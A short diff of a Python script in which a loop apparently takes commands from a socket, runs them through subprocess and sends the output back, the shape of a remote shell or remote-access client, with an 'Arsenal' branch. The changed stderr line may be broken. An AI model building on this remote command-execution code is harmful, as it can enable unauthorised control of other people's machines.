@@ -36,9 +36,8 @@ def main():
                 del command[0]
                 print(command)
                 try:
-                    output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    output = subprocess.run(command, stdout=subprocess.PIPE, stderr=stdout)
                 except:
-                    print(output.stderr)
                     continue
                 sendit(s, output.stdout)
             elif 'Arsenal' in command:
